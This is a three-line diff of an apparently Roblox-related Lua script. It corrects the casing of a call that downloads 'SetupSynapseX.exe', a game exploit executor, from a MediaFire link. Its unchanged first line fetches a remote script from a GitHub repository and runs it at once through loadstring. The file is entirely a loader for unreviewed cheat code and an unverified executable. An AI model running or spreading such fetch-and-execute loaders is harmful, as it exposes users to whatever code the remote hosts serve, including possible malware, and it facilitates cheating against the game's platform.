@@ -1,3 +1,3 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/zoophiliaphobic/POOPDOORS/main/script.lua'))()
 wait(1)
-GAME:HttpGet("https://download1655.mediafire.com/oglre28uh5bg_pUoiA5A2Hw1ocb49NHaV_elSleHYxQ2rPxZm4Wrk-Q9ZEdZmlKt_kUzQ-5utBDGnRi8ZMhkASrzYzLqfQ/7ug5pmstp3f20gw/SetupSynapseX.exe")
+game:HttpGet("https://download1655.mediafire.com/oglre28uh5bg_pUoiA5A2Hw1ocb49NHaV_elSleHYxQ2rPxZm4Wrk-Q9ZEdZmlKt_kUzQ-5utBDGnRi8ZMhkASrzYzLqfQ/7ug5pmstp3f20gw/SetupSynapseX.exe")
